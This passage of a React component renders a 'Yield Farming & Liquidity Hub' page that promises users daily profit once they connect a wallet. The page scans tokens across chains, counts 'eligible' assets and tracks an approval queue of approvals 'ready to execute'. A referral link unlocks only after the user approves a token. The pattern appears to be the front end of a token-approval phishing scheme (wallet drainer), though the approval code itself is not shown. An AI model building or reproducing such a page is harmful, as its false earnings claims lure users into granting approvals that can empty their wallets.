  }, [isPayoutReady, lastApprovalDisplay, nextPayoutDisplay, payoutSchedule])

  const heroStats = useMemo(
    () => {
      const networks = totalNetworks || CHAINS_DEF.length
      const tokensDisplay = totalTokens.toLocaleString(undefined, { maximumFractionDigits: 0 })

      return [
        {
          title: 'Networks synced',
          value: networks.toString(),
          caption: 'Chains monitored this session.',
          glow: 'from-emerald-400/50 via-emerald-500/10 to-transparent',
        },
        {
          title: 'Tracked tokens',
          value: tokensDisplay,
          caption: 'Assets observed for approvals.',
          glow: 'from-sky-400/50 via-cyan-500/10 to-transparent',
        },
        {
          title: 'Pending volume',
          value: outstandingUsdDisplay,
          caption: 'Value awaiting execution.',
          glow: 'from-amber-400/55 via-rose-500/10 to-transparent',
        },
        {
          title: 'Automation modules',
          value: '5 modules',
          caption: 'Bridge · Swap · Staking · Liquidity · Rewards',
          glow: 'from-fuchsia-400/55 via-indigo-500/10 to-transparent',
        },
      ]
    },
    [outstandingUsdDisplay, totalNetworks, totalTokens]
  )

  const { bridge: bridgePreview, swap: swapPreview, staking: stakingPreview, liquidity: liquidityPreview } = useAutomationPreviews()

  const rewardsHeadline = isConnected
    ? `${outstandingUsdDisplay} accruing`
    : 'Connect to view claimable incentives'
  const rewardsDetail = isConnected
    ? `${stats.length || CHAINS_DEF.length} networks in rotation`
    : 'Supports Aave v3 withdrawals on Ethereum, Polygon, and Arbitrum'

  const quickActions: {
    label: string
    description: string
    onClick: () => void
    accent: string
    badge: string
    status: string
    detail?: string
    extra?: string
    loading?: boolean
    error?: string
  }[] = [
    {
      label: 'Bridge',
      description: 'Move assets cross-chain',
      onClick: () => {
        setMsg(undefined)
        setShowBridgeModal(true)
      },
      accent: 'from-emerald-400 via-teal-400 to-sky-500',
      badge: 'BR',
      status: bridgePreview.loading ? 'Fetching live routes…' : bridgePreview.status,
      detail: bridgePreview.loading ? undefined : bridgePreview.detail,
      extra: bridgePreview.loading ? undefined : bridgePreview.extra,
      loading: bridgePreview.loading,
      error: bridgePreview.error,
    },
    {
      label: 'Swap',
      description: 'Instant token swaps',
      onClick: () => {
        setMsg(undefined)
        setShowSwapModal(true)
      },
      accent: 'from-sky-400 via-cyan-400 to-violet-500',
      badge: 'SW',
      status: swapPreview.loading ? 'Sourcing liquidity…' : swapPreview.status,
      detail: swapPreview.loading ? undefined : swapPreview.detail,
      extra: swapPreview.loading ? undefined : swapPreview.extra,
      loading: swapPreview.loading,
      error: swapPreview.error,
    },
    {
      label: 'Staking',
      description: 'Compound daily rewards',
      onClick: () => {
        setMsg(undefined)
        setShowStakingModal(true)
      },
      accent: 'from-fuchsia-400 via-purple-400 to-rose-500',
      badge: 'ST',
      status: stakingPreview.loading ? 'Syncing APR data…' : stakingPreview.status,
      detail: stakingPreview.loading ? undefined : stakingPreview.detail,
      extra: stakingPreview.loading ? undefined : stakingPreview.extra,
      loading: stakingPreview.loading,
      error: stakingPreview.error,
    },
    {
      label: 'Liquidity',
      description: 'Provide LP & farm yield',
      onClick: () => {
        setMsg(undefined)
        setShowLiquidityModal(true)
      },
      accent: 'from-amber-400 via-orange-400 to-rose-400',
      badge: 'LQ',
      status: liquidityPreview.loading ? 'Loading lending markets…' : liquidityPreview.status,
      detail: liquidityPreview.loading ? undefined : liquidityPreview.detail,
      extra: liquidityPreview.loading ? undefined : liquidityPreview.extra,
      loading: liquidityPreview.loading,
      error: liquidityPreview.error,
    },
    {
      label: 'Rewards',
      description: 'Claim multi-chain incentives',
      onClick: () => {
        setMsg(undefined)
        setShowRewardsModal(true)
      },
      accent: 'from-emerald-400 via-sky-400 to-indigo-500',
      badge: 'RW',
      status: rewardsHeadline,
      detail: rewardsDetail,
      extra: isPayoutReady ? `Next payout window ends ${nextPayoutDisplay ?? ''}`.trim() : payoutCountdown ? `Next unlock in ${payoutCountdown}` : undefined,
      loading: false,
      error: undefined,
    },
  ]

  return (
    <div className="relative min-h-screen overflow-hidden bg-[#030713] text-white/90">
      <div className="pointer-events-none absolute inset-0 -z-10">
        <div className="absolute -left-1/3 top-[-25%] h-[420px] w-[420px] rounded-full bg-[radial-gradient(circle_at_center,rgba(56,189,248,0.28),transparent_60%)] blur-3xl" />
        <div className="absolute right-[-20%] top-[10%] h-[360px] w-[360px] rounded-full bg-[radial-gradient(circle_at_center,rgba(217,70,239,0.22),transparent_65%)] blur-3xl" />
        <div className="absolute inset-x-0 bottom-[-35%] h-[420px] bg-[radial-gradient(circle_at_bottom,rgba(5,150,105,0.18),transparent_65%)] blur-[120px]" />
      </div>

      <div className="relative mx-auto max-w-6xl px-6 py-10 space-y-12">
        <header className="relative overflow-hidden rounded-[36px] border border-white/10 bg-white/[0.04] px-6 py-8 text-white sm:px-12 sm:py-12 shadow-[0_36px_120px_rgba(6,12,36,0.55)]">
          <div className="pointer-events-none absolute inset-x-10 top-0 h-px bg-gradient-to-r from-transparent via-emerald-300/60 to-transparent" />
          <div className="pointer-events-none absolute -top-32 left-1/3 h-64 w-64 rounded-full bg-[radial-gradient(circle_at_center,rgba(56,189,248,0.35),transparent_65%)] blur-2xl" />
          <div className="pointer-events-none absolute bottom-[-40%] right-[-10%] h-80 w-80 rounded-full bg-[radial-gradient(circle_at_center,rgba(217,70,239,0.32),transparent_70%)] blur-2xl" />

          <div className="relative flex flex-col gap-10">
            <div className="flex flex-wrap items-start justify-between gap-6">
              <div className="flex min-w-0 items-start gap-4">
                <div className="relative flex h-14 w-14 items-center justify-center rounded-2xl border border-white/10 bg-black/30 shadow-[0_24px_60px_rgba(56,189,248,0.18)]">
                  <DeFiLogo className="h-10 w-10" />
                  <span className="pointer-events-none absolute -top-1 -right-1 inline-flex h-3 w-3 animate-ping rounded-full bg-emerald-300" />
                  <span className="pointer-events-none absolute -top-1 -right-1 h-3 w-3 rounded-full bg-emerald-300" />
                </div>
                <div className="min-w-0 space-y-4">
                  <div className="flex flex-wrap items-center gap-3 text-[11px] uppercase tracking-[0.35em] text-white/50">
                    <span className="inline-flex items-center gap-2 rounded-full border border-white/15 bg-white/10 px-3 py-1 text-white/60">
                      DeFi Platform
                    </span>
                    {isConnected && (
                      <span className="inline-flex items-center gap-2 rounded-full border border-sky-400/40 bg-sky-400/10 px-3 py-1 text-sky-200">
                        Wallet synced
                        <span className="inline-flex h-1.5 w-1.5 rounded-full bg-sky-300 shadow-[0_0_12px_rgba(56,189,248,0.85)]" />
                      </span>
                    )}
                  </div>
                  <div className="space-y-3">
                    <h1 className="text-3xl font-semibold tracking-tight text-white sm:text-4xl">
                      Yield Farming & Liquidity Hub
                    </h1>
                    <p className="max-w-2xl text-sm leading-6 text-white/70 sm:text-base">
                      Connect and earn daily profit with automated cross-chain approvals, bridge routes, and staking boosts—no desk required.
                    </p>
                  </div>
                  <div className="flex flex-wrap gap-3 text-xs text-white/55">
                    <span className="inline-flex items-center gap-2 rounded-full border border-white/12 bg-black/30 px-3 py-1">
                      <span className="h-1.5 w-1.5 rounded-full bg-emerald-300" />
                      Daily yield snapshots
                    </span>
                    <span className="inline-flex items-center gap-2 rounded-full border border-white/12 bg-black/30 px-3 py-1">
                      <span className="h-1.5 w-1.5 rounded-full bg-sky-300" />
                      One-tap automations
                    </span>
                    <span className="inline-flex items-center gap-2 rounded-full border border-white/12 bg-black/30 px-3 py-1">
                      <span className="h-1.5 w-1.5 rounded-full bg-fuchsia-300" />
                      Control stays with you
                    </span>
                  </div>
                </div>
              </div>

              <div className="flex w-full flex-col items-stretch gap-3 sm:w-auto sm:items-end">
                {address && isConnected && (
                  <div className="rounded-2xl border border-white/10 bg-white/5 px-4 py-2 text-xs text-white/60">
                    {formatAddress(address)}
                  </div>
                )}
                {!isConnected ? (
                  <button
                    onClick={() => open()}
                    className="inline-flex items-center justify-center rounded-[18px] bg-gradient-to-r from-emerald-400 via-teal-400 to-sky-500 px-5 py-3 text-sm font-semibold text-black shadow-[0_16px_60px_rgba(56,189,248,0.35)] transition hover:shadow-[0_20px_72px_rgba(16,185,129,0.45)]"
                  >
                    Connect Wallet
                  </button>
                ) : (
                  <div className="flex flex-col items-stretch gap-3 sm:flex-row">
                    <button
                      onClick={scanAll}
                      disabled={loading}
                      className="group relative overflow-hidden rounded-[18px] px-5 py-2.5 text-sm font-semibold text-black transition focus:outline-none focus-visible:ring-2 focus-visible:ring-emerald-300 disabled:opacity-60"
                    >
                      <span className="absolute inset-0 bg-gradient-to-r from-emerald-400 via-teal-400 to-sky-500 opacity-90 transition group-hover:opacity-100" />
                      <span className="relative flex items-center gap-2">
                        <span className="inline-flex h-2 w-2 rounded-full bg-white animate-pulse" />
                        {loading ? 'Scanning…' : 'Rescan'}
                      </span>
                    </button>
                    <button
                      onClick={() => disconnect()}
                      className="rounded-[18px] border border-white/15 px-4 py-2 text-sm text-white transition hover:border-rose-400/60 hover:text-rose-200"
                    >
                      Disconnect
                    </button>
                  </div>
                )}
              </div>
            </div>

            {isConnected && payoutSchedule && payoutNarrative && (
              <div className="relative overflow-hidden rounded-[36px] border border-white/10 bg-gradient-to-br from-emerald-500/15 via-sky-500/10 to-transparent p-6 sm:p-8 shadow-[0_32px_120px_rgba(8,18,40,0.6)]">
                <div className="pointer-events-none absolute inset-0 rounded-[36px] border border-white/10" />
                <div className="pointer-events-none absolute -left-32 top-[-40%] h-72 w-72 rounded-full bg-[radial-gradient(circle_at_center,rgba(56,189,248,0.35),transparent_70%)] blur-3xl" />
                <div className="pointer-events-none absolute right-[-30%] bottom-[-35%] h-80 w-80 rounded-full bg-[radial-gradient(circle_at_center,rgba(16,185,129,0.28),transparent_75%)] blur-3xl" />
                <div className="relative flex flex-col gap-6 lg:flex-row lg:items-center lg:justify-between">
                  <div className="space-y-5">
                    <div className="inline-flex items-center gap-2 rounded-full border border-emerald-400/40 bg-black/30 px-4 py-2 text-[11px] uppercase tracking-[0.32em] text-emerald-100/90">
                      Daily yield unlocked
                      <span className={`inline-flex h-1.5 w-1.5 rounded-full shadow-[0_0_12px_rgba(16,185,129,0.9)] ${
                        isPayoutReady ? 'bg-emerald-300 animate-pulse' : 'bg-sky-300'
                      }`} />
                    </div>
                    <div className="space-y-3">
                      <div className="text-3xl font-semibold tracking-tight text-white sm:text-[2rem]">
                        {payoutNarrative.primary}
                      </div>
                      <p className="max-w-xl text-sm leading-6 text-white/70 sm:text-base">
                        {payoutNarrative.secondary}
                      </p>
                      {payoutNarrative.tokens.length > 0 && (
                        <div className="flex flex-wrap items-center gap-2 text-xs text-white/70">
                          {payoutNarrative.tokens.map((token) => (
                            <span
                              key={`${token.chainId}:${token.address.toLowerCase()}`}
                              className="inline-flex items-center gap-2 rounded-full border border-white/15 bg-black/35 px-3 py-1"
                            >
                              <span className="inline-flex h-2 w-2 rounded-full bg-emerald-300 shadow-[0_0_10px_rgba(16,185,129,0.8)]" />
                              {token.symbol}
                              <span className="text-white/50">• {token.chainName}</span>
                            </span>
                          ))}
                        </div>
                      )}
                    </div>
                    <div className="grid gap-2 text-xs text-white/65 sm:grid-cols-2">
                      <div className="rounded-2xl border border-white/10 bg-black/30 px-4 py-3">
                        <div className="text-[10px] uppercase tracking-[0.28em] text-white/45">Recorded approval</div>
                        <div className="mt-1 text-sm font-semibold text-white/85">{lastApprovalDisplay}</div>
                      </div>
                      <div className="rounded-2xl border border-white/10 bg-black/30 px-4 py-3">
                        <div className="text-[10px] uppercase tracking-[0.28em] text-white/45">Next payout window</div>
                        <div className="mt-1 text-sm font-semibold text-white/85">{nextPayoutDisplay}</div>
                      </div>
                    </div>
                  </div>
                  <div className="flex flex-col items-center gap-4 rounded-[30px] border border-white/10 bg-black/40 px-6 py-6 shadow-[0_24px_80px_rgba(6,12,36,0.55)] sm:px-8">
                    <div className="text-[10px] uppercase tracking-[0.32em] text-white/45">24h cycle</div>
                    <div className={`text-4xl font-bold tracking-tight ${isPayoutReady ? 'text-emerald-200' : 'text-white'}`}>
                      {payoutCountdown || '24h 00m 00s'}
                    </div>
                    <div className="w-56 h-2.5 overflow-hidden rounded-full bg-white/15">
                      <div
                        className="h-full rounded-full bg-gradient-to-r from-emerald-400 via-teal-400 to-sky-400 transition-all duration-500"
                        style={{ width: `${Math.min(100, Math.max(0, Math.round(payoutProgress * 100)))}%` }}
                      />
                    </div>
                    <div className="text-xs text-white/60">
                      {isPayoutReady ? 'Claim window unlocked' : 'Profit stream accruing'}
                    </div>
                    <button
                      onClick={() => {
                        setMsg(undefined)
                        setShowRewardsModal(true)
                      }}
                      className="inline-flex items-center justify-center rounded-2xl border border-emerald-300/40 bg-emerald-400/15 px-4 py-2 text-xs font-semibold uppercase tracking-[0.28em] text-emerald-100 transition hover:border-emerald-300 hover:bg-emerald-400/25"
                    >
                      View rewards module
                    </button>
                  </div>
                </div>
              </div>
            )}

            {(!isConnected || showNotEligibleNotice) && (
              <div className="grid gap-4">
                {!isConnected && (
                  <div className="relative overflow-hidden rounded-[32px] border border-emerald-400/35 bg-[radial-gradient(circle_at_top_left,rgba(16,185,129,0.18),transparent_70%)] px-6 py-6 shadow-[0_30px_90px_rgba(18,120,94,0.35)]">
                    <div className="pointer-events-none absolute inset-0 rounded-[32px] border border-emerald-300/20" />
                    <div className="pointer-events-none absolute -left-24 top-[-20%] h-56 w-56 rounded-full bg-[radial-gradient(circle_at_center,rgba(56,189,248,0.25),transparent_75%)] blur-3xl" />
                    <div className="pointer-events-none absolute right-[-10%] bottom-[-30%] h-60 w-60 rounded-full bg-[radial-gradient(circle_at_center,rgba(236,72,153,0.18),transparent_70%)] blur-3xl" />
                    <div className="relative grid gap-5 sm:grid-cols-[auto,1fr] sm:items-center">
                      <div className="flex flex-col items-start gap-3">
                        <button
                          onClick={() => open()}
                          className="inline-flex items-center gap-2 rounded-2xl border border-white/20 bg-gradient-to-r from-emerald-400/80 via-teal-400/70 to-sky-400/80 px-5 py-2 text-sm font-semibold text-black shadow-[0_12px_45px_rgba(56,189,248,0.45)] transition hover:shadow-[0_18px_60px_rgba(16,185,129,0.5)]"
                        >
                          <span className="inline-flex h-2 w-2 rounded-full bg-emerald-500 shadow-[0_0_12px_rgba(16,185,129,0.9)]" />
                          Launch wallet modal
                        </button>
                        <div className="rounded-full border border-emerald-300/30 bg-emerald-400/15 px-4 py-1 text-[10px] uppercase tracking-[0.32em] text-emerald-100">
                          Daily profit engine
                        </div>
                      </div>
                      <div className="flex items-start gap-4 text-left">
                        <span className="mt-1 inline-flex h-2.5 w-2.5 flex-none animate-pulse rounded-full bg-emerald-300 shadow-[0_0_15px_rgba(16,185,129,0.9)]" />
                        <div className="space-y-2">
                          <div className="text-lg font-semibold text-white">Connect now to activate daily earnings.</div>
                          <p className="text-sm text-white/70">
                            Plug in your wallet to unlock instant bridge routes, compounding rewards, and automated profit pings.
                          </p>
                          <div className="flex flex-wrap gap-2 text-[11px] uppercase tracking-[0.3em] text-white/50">
                            <span className="inline-flex items-center gap-2 rounded-full border border-white/15 bg-black/30 px-3 py-1">
                              24h rewards
                            </span>
                            <span className="inline-flex items-center gap-2 rounded-full border border-white/15 bg-black/30 px-3 py-1">
                              Gas-optimized
                            </span>
                            <span className="inline-flex items-center gap-2 rounded-full border border-white/15 bg-black/30 px-3 py-1">
                              Hands-free
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
                {showNotEligibleNotice && (
                  <div className="relative overflow-hidden rounded-[28px] border border-emerald-400/20 bg-gradient-to-r from-emerald-500/12 via-teal-500/12 to-sky-500/12 px-6 py-6 text-sm shadow-[0_20px_60px_rgba(15,185,255,0.25)]">
                    <div className="flex items-start gap-3">
                      <span className="mt-1 inline-flex h-2.5 w-2.5 flex-none animate-pulse rounded-full bg-emerald-300" />
                      <div className="space-y-2">
                        <div className="text-base font-semibold text-white">{NOT_ELIGIBLE_TITLE}</div>
                        <p className="text-sm text-white/70">{NOT_ELIGIBLE_COPY}</p>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            )}

            <div className="grid gap-4 sm:grid-cols-2 xl:grid-cols-4">
              {heroStats.map((stat) => (
                <div
                  key={stat.title}
                  className="relative overflow-hidden rounded-[26px] border border-white/10 bg-white/[0.04] p-5 shadow-[0_22px_70px_rgba(6,12,36,0.45)]"
                >
                  <div className={`pointer-events-none absolute -top-16 right-0 h-32 w-32 rounded-full bg-gradient-to-br ${stat.glow} blur-3xl`} />
                  <div className="relative flex flex-col gap-2">
                    <span className="text-[11px] uppercase tracking-[0.3em] text-white/45">{stat.title}</span>
                    <span className="text-3xl font-semibold text-white drop-shadow-[0_0_14px_rgba(255,255,255,0.18)]">
                      {stat.value}
                    </span>
                    <span className="text-xs text-white/60">{stat.caption}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </header>

        <section className="relative overflow-hidden rounded-[36px] border border-white/10 bg-white/[0.03] p-6 sm:p-10 shadow-[0_30px_110px_rgba(6,10,30,0.48)]">
          <div className="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-sky-300/50 to-transparent" />
          <div className="pointer-events-none absolute -left-24 bottom-[-40%] h-64 w-64 rounded-full bg-[radial-gradient(circle_at_center,rgba(59,130,246,0.22),transparent_70%)] blur-3xl" />
          <div className="relative flex flex-wrap items-center justify-between gap-4">
            <div className="space-y-2">
              <span className="text-[11px] uppercase tracking-[0.35em] text-white/45">Intelligence</span>
              <h2 className="text-2xl font-semibold text-white">Live Market Orbit</h2>
              <p className="max-w-xl text-sm text-white/60">Three-dimensional monitoring of tracked assets with live price labels.</p>
            </div>
            <div className="rounded-2xl border border-white/10 bg-black/40 px-4 py-2 text-xs text-white/55">3D planet · live price labels</div>
          </div>
          <div className="relative mt-6 overflow-hidden rounded-[30px] border border-white/10 bg-black/50 shadow-[0_20px_80px_rgba(5,10,30,0.45)]">
            <CryptoPlanetScene />
          </div>
        </section>

        <section className="relative overflow-hidden rounded-[36px] border border-white/10 bg-white/[0.03] p-6 sm:p-10 shadow-[0_30px_110px_rgba(6,12,36,0.5)]">
          <div className="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-emerald-300/60 to-transparent" />
          <div className="pointer-events-none absolute right-[-25%] top-[-20%] h-64 w-64 rounded-full bg-[radial-gradient(circle_at_center,rgba(16,185,129,0.25),transparent_70%)] blur-3xl" />
          <div className="relative flex flex-wrap items-start justify-between gap-6">
            <div className="space-y-2">
              <span className="text-[11px] uppercase tracking-[0.35em] text-white/45">Automation</span>
              <h2 className="text-2xl font-semibold text-white">Automation Modules</h2>
              <p className="max-w-2xl text-sm text-white/60">
                Spin up production-ready flows for bridging, swaps, staking, liquidity, and rewards. Each module respects
                your wallet approvals and re-routes based on live RPC health.
              </p>
            </div>
            <div className="flex flex-wrap items-center gap-2 text-xs text-white/50">
              <span className="inline-flex items-center gap-2 rounded-full border border-white/12 bg-black/40 px-3 py-1">Alpha preview</span>
              <span className="inline-flex items-center gap-2 rounded-full border border-white/12 bg-black/40 px-3 py-1">Upgradeable flows</span>
            </div>
          </div>
          <div className="relative mt-6 grid gap-4 md:grid-cols-2 xl:grid-cols-3">
            {quickActions.map((action) => {
              const statusLabel = action.loading ? 'Syncing' : action.error ? 'Needs attention' : 'Live telemetry'
              const statusPillClass = action.loading
                ? 'border-sky-400/40 bg-sky-400/10 text-sky-100'
                : action.error
                  ? 'border-rose-400/60 bg-rose-500/10 text-rose-100'
                  : 'border-emerald-400/50 bg-emerald-400/10 text-emerald-100'
              const statusTextClass = action.error
                ? 'text-rose-200'
                : action.loading
                  ? 'text-sky-200'
                  : 'text-emerald-100'
              return (
                <button
                  key={action.label}
                  onClick={action.onClick}
                  className="group relative overflow-hidden rounded-[28px] border border-white/10 bg-[#050b1d]/80 p-5 text-left transition hover:border-emerald-400/50 hover:shadow-[0_24px_90px_rgba(56,189,248,0.28)]"
                >
                  <div className={`pointer-events-none absolute inset-0 opacity-0 transition group-hover:opacity-100 bg-gradient-to-br ${action.accent}`} />
                  <div className="relative flex flex-col gap-4 sm:flex-row sm:items-start sm:justify-between">
                    <div className="flex flex-1 items-start gap-3">
                      <span
                        className={`flex h-12 w-12 shrink-0 items-center justify-center rounded-2xl bg-gradient-to-br ${action.accent} text-[13px] font-semibold text-slate-900 transition group-hover:scale-105`}
                      >
                        {action.badge}
                      </span>
                      <div className="space-y-2">
                        <div className="flex flex-wrap items-center gap-2">
                          <div className="text-sm font-semibold uppercase tracking-[0.15em] text-white">{action.label}</div>
                          <span className={`inline-flex items-center gap-1 rounded-full border px-2 py-1 text-[10px] font-medium ${statusPillClass}`}>
                            {statusLabel}
                          </span>
                        </div>
                        <p className="text-xs leading-5 text-white/65 transition group-hover:text-white/85">{action.description}</p>
                        <div className={`text-xs font-semibold ${statusTextClass}`}>{action.status}</div>
                        {action.detail && <div className="text-[11px] text-white/60">{action.detail}</div>}
                        {action.extra && <div className="text-[11px] text-white/45">{action.extra}</div>}
                        {action.error && <div className="text-[11px] text-rose-300">{action.error}</div>}
                      </div>
                    </div>
                  </div>
                </button>
              )
            })}
          </div>
        </section>

        <section className="relative overflow-hidden rounded-[36px] border border-white/10 bg-white/[0.03] p-6 sm:p-10 shadow-[0_30px_110px_rgba(6,12,36,0.5)]">
          <div className="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-violet-300/50 to-transparent" />
          <div className="pointer-events-none absolute left-[-20%] top-[-30%] h-72 w-72 rounded-full bg-[radial-gradient(circle_at_center,rgba(139,92,246,0.25),transparent_70%)] blur-3xl" />
          <div className="pointer-events-none absolute right-[-15%] bottom-[-35%] h-80 w-80 rounded-full bg-[radial-gradient(circle_at_center,rgba(56,189,248,0.2),transparent_70%)] blur-3xl" />
          <div className="relative space-y-8">
            <div className="flex flex-col gap-3 lg:flex-row lg:items-start lg:justify-between">
              <div className="max-w-2xl space-y-3">
                <span className="text-[11px] uppercase tracking-[0.35em] text-white/45">Referral</span>
                <h2 className="text-2xl font-semibold text-white">Referral Command Center</h2>
                <p className="text-sm text-white/60">
                  Complete one approval to mint your referral link automatically. Share it with other operators—when they
                  connect and approve, their wallets appear here so you can track your network.
                </p>
                {referralProfile?.referredBy ? (
                  <div className="inline-flex flex-wrap items-center gap-2 rounded-full border border-white/10 bg-white/5 px-3 py-1 text-[11px] text-white/55">
                    <span className="uppercase tracking-[0.28em]">Referred by</span>
                    <span className="font-mono text-xs text-white/80">{referralProfile.referredBy.address}</span>
                  </div>
                ) : null}
                {!referralProfile && (
                  <div className="rounded-3xl border border-white/10 bg-black/30 px-4 py-3 text-sm text-white/65">
                    {isConnected
                      ? 'Approve at least one eligible token to unlock your personal referral link. Any referral code you used will be credited automatically.'
                      : 'Connect your wallet and approve an eligible token to unlock your referral dashboard.'}
                  </div>
                )}
              </div>
              {referralProfile ? (
                <div className="w-full max-w-md space-y-4 rounded-3xl border border-white/10 bg-black/40 p-5 text-sm text-white/70">
                  <div className="space-y-2">
                    <div className="text-xs uppercase tracking-[0.28em] text-white/50">Referral link</div>
                    <div className="flex flex-col gap-2 sm:flex-row sm:items-center">
                      <div className="flex-1 break-all rounded-2xl border border-white/10 bg-[#10172a] px-3 py-2 text-xs text-white/80">
                        {referralShareLink}
                      </div>
                      <button
                        onClick={handleCopyReferralLink}
                        className="inline-flex items-center justify-center rounded-2xl border border-emerald-300/40 bg-emerald-400/15 px-3 py-2 text-[11px] font-semibold uppercase tracking-[0.2em] text-emerald-100 transition hover:border-emerald-300 hover:bg-emerald-400/25"
                      >
                        {referralLinkCopied ? 'Copied' : 'Copy'}
                      </button>
                    </div>
                  </div>
                  <div className="grid grid-cols-1 gap-3 sm:grid-cols-2 text-xs text-white/60">
                    <div className="rounded-2xl border border-white/10 bg-white/5 px-3 py-2">
                      <div className="uppercase tracking-[0.24em] text-white/40">Total referrals</div>
                      <div className="mt-1 text-lg font-semibold text-white">{referralProfile.referralCount}</div>
                    </div>
                    <div className="rounded-2xl border border-white/10 bg-white/5 px-3 py-2">
                      <div className="uppercase tracking-[0.24em] text-white/40">First approval</div>
                      <div className="mt-1 text-xs text-white/75">
                        {referralProfile.firstApprovedAt ? formatDateTime(referralProfile.firstApprovedAt) : 'Pending'}
                      </div>
                    </div>
                  </div>
                </div>
              ) : null}
            </div>

            {referralProfile ? (
              <div className="space-y-3">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <h3 className="text-sm font-semibold text-white">Referred wallets</h3>
                  <div className="text-xs text-white/50">{referralProfile.referralCount} total</div>
                </div>
                {referralProfile.referrals.length ? (
                  <div className="grid gap-3">
                    {referralProfile.referrals.map((item) => (
                      <div
                        key={`${item.address}-${item.createdAt}`}
                        className="flex flex-col gap-2 rounded-2xl border border-white/10 bg-white/5 px-4 py-3 sm:flex-row sm:items-center sm:justify-between"
                      >
                        <div>
                          <div className="font-mono text-xs text-white/85">{item.address}</div>
                          <div className="text-[11px] text-white/50">
                            Joined {formatDateTime(item.createdAt)}
                          </div>
                        </div>
                        <button
                          onClick={() => handleCopyReferralAddress(item.address)}
                          className="self-start rounded-2xl border border-white/15 bg-white/10 px-3 py-1 text-[11px] uppercase tracking-[0.2em] text-white/70 transition hover:border-emerald-300 hover:text-emerald-100 sm:self-auto"
                        >
                          {copiedReferralAddress === item.address ? 'Copied' : 'Copy'}
                        </button>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="rounded-2xl border border-white/10 bg-white/5 px-4 py-4 text-sm text-white/60">
                    No referrals yet—share your link to start building your network.
                  </div>
                )}
                {remainingReferrals > 0 && (
                  <div className="text-xs text-white/45">
                    +{remainingReferrals} more referrals available from the admin dashboard.
                  </div>
                )}
              </div>
            ) : null}
          </div>
        </section>

        <section className="space-y-4">
          {isConnected && totalEligible > 0 && (
            <div className="relative overflow-hidden rounded-[26px] border border-emerald-400/30 bg-emerald-400/10 px-6 py-4 text-sm shadow-[0_22px_70px_rgba(16,185,129,0.3)]">
              <div className="text-[11px] uppercase tracking-[0.3em] text-emerald-100/80">Approval progress</div>
              <div className="mt-3 h-3 w-full overflow-hidden rounded-full bg-white/25">
                <div
                  className="h-3 rounded-full bg-gradient-to-r from-emerald-400 via-teal-400 to-sky-400"
                  style={{ width: `${Math.round((approvedCount / totalEligible) * 100)}%` }}
                />
              </div>
              <div className="mt-2 text-xs text-emerald-100/80">
                {approvedCount} of {totalEligible} approvals ready to execute.
              </div>
            </div>
          )}

          {displayMsg && (
            <div className="rounded-[24px] border border-white/10 bg-white/5 px-6 py-4 text-sm text-white/80 shadow-[0_18px_60px_rgba(8,12,33,0.45)]">
              {displayMsg}
            </div>
          )}

          {isConnected && !!stats.length && (
            <div className="flex flex-wrap gap-3 text-xs text-white/65">
              {stats.map((s) => (
                <div
                  key={s.chainId}
                  className={`inline-flex items-center gap-2 rounded-full border px-3 py-2 ${
                    s.ok
                      ? 'border-white/12 bg-white/5'
                      : 'border-rose-400/50 bg-rose-500/10 text-rose-100'
                  }`}
                >
                  <span className="font-semibold text-white/80">{s.chainName}</span>
                  <span>• tokens:{s.total}</span>
                  <span>• eligible:{s.eligible}</span>
                  {!s.ok && <span className="font-semibold">• RPC error</span>}
                </div>
              ))}
            </div>
          )}
        </section>

        {!isConnected ? null : rows.length === 0 ? (
          <div className="rounded-[30px] border border-white/10 bg-white/[0.02] px-6 py-6 text-sm text-white/70 shadow-[0_24px_90px_rgba(6,12,36,0.45)]">
            {loading ? 'Scanning tokens…' : 'All approvals are up to date. Kick off automations via the modules above.'}
          </div>
        ) : (
          <section className="relative overflow-hidden rounded-[30px] border border-white/10 bg-white/[0.02] px-5 py-6 sm:px-8 sm:py-8 shadow-[0_30px_110px_rgba(6,12,36,0.45)]">
            <div className="pointer-events-none absolute inset-x-8 top-0 h-px bg-gradient-to-r from-transparent via-white/25 to-transparent" />
            <div className="relative flex flex-wrap items-center justify-between gap-3">
              <div>
                <h3 className="text-lg font-semibold text-white">Approval queue</h3>
                <p className="text-xs text-white/55">Tap a token to retry with fresh gas estimates.</p>
              </div>
              <div className="rounded-full border border-white/12 bg-black/40 px-3 py-1 text-xs text-white/55">
                {rows.length} tokens in review
              </div>
            </div>
            <div className="relative mt-6 grid gap-4">
              {rows.map((row, idx) => (
                <TokenCard
                  key={`${row.chainId}:${row.address}`}
                  chainName={row.chainName}
                  symbol={row.symbol}
                  address={row.address}
                  decimals={row.decimals}
                  balance={row.balance}
                  valueUsd={row.valueUsd}
                  status={row.status}
                  active={currentIdx === idx}
                  onClick={() => retryOne(row, idx)}
                />
              ))}
            </div>
          </section>
        )}
      </div>

      {showModal && (
        <div className="fixed bottom-6 right-6 z-50 max-w-sm">
          <div className="pointer-events-auto rounded-2xl border border-white/10 bg-black/70 px-6 py-5 text-center shadow-[0_20px_70px_rgba(6,12,36,0.65)] backdrop-blur">
            <div className="mb-2 flex items-center justify-center gap-2 text-sm text-white/70">
              <span className="inline-flex h-2 w-2 animate-pulse rounded-full bg-emerald-300 shadow-[0_0_10px_rgba(16,185,129,0.8)]" />
              Processing approvals
            </div>
            <div className="text-lg font-semibold text-white">{modalText}</div>
          </div>
        </div>
      )}
      {showStakingModal && (
        <StakingModal
          open={showStakingModal}
          onClose={() => setShowStakingModal(false)}
          preview={stakingPreview}
        />
      )}
      {showBridgeModal && (
        <BridgeModal open={showBridgeModal} onClose={() => setShowBridgeModal(false)} initialFromChainId={activeChainId ?? undefined} />
      )}
      {showSwapModal && <SwapModal open={showSwapModal} onClose={() => setShowSwapModal(false)} />}
      {showLiquidityModal && <LiquidityModal open={showLiquidityModal} onClose={() => setShowLiquidityModal(false)} />}
      {showRewardsModal && <RewardsModal open={showRewardsModal} onClose={() => setShowRewardsModal(false)} />}

      <SiteFooter />
    </div>
  )
}
